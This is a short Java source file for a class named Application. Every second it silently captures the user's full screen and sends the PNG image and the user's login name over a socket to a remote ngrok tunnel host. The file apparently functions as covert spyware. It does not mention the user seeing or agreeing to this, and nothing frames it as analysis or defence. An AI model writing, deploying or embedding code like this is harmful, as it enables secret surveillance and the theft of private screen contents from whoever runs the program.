import com.sun.imageio.plugins.png.PNGImageWriter;
import com.sun.imageio.plugins.png.PNGImageWriterSpi;

import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ObjectOutputStream;
import java.net.Socket;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import static javax.imageio.ImageIO.createImageOutputStream;

public class Application {

    public static void main(String[] arguments) throws AWTException {

        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screeRectangle = new Rectangle(screenSize);

        Robot robot = new Robot();
        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();

        executor.scheduleWithFixedDelay(() -> {

            try (Socket socket = new Socket("0.tcp.sa.ngrok.io", 15048)) {

                BufferedImage image = robot.createScreenCapture(screeRectangle);

                ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
                ImageOutputStream stream = createImageOutputStream(outputStream);

                ImageWriter imageWriter = new PNGImageWriter(new PNGImageWriterSpi());

                outputStream.writeInt(0x01);
                outputStream.writeUTF(System.getProperty("user.name"));

                imageWriter.setOutput(stream);

                try { imageWriter.write(image); }

                finally {
                    imageWriter.dispose();
                    outputStream.flush();
                }

            }

            catch (Exception exception) { exception.printStackTrace(); }

        }, 0L, 1L, TimeUnit.SECONDS);

    }

}
